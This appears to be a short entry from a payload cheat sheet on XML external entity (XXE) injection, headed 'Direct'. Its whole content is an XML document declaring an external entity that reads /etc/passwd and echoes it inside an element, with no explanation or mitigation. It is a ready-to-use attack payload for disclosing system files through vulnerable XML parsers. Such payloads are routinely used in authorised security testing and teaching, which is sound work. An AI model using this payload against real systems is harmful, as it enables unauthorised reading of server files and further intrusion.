# XXE

## 1) Direct

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ 
  <!ENTITY xxe SYSTEM "/etc/passwd">
] >
<site>
    <vuln>Vuln &xxe;</vuln>
</site>
```
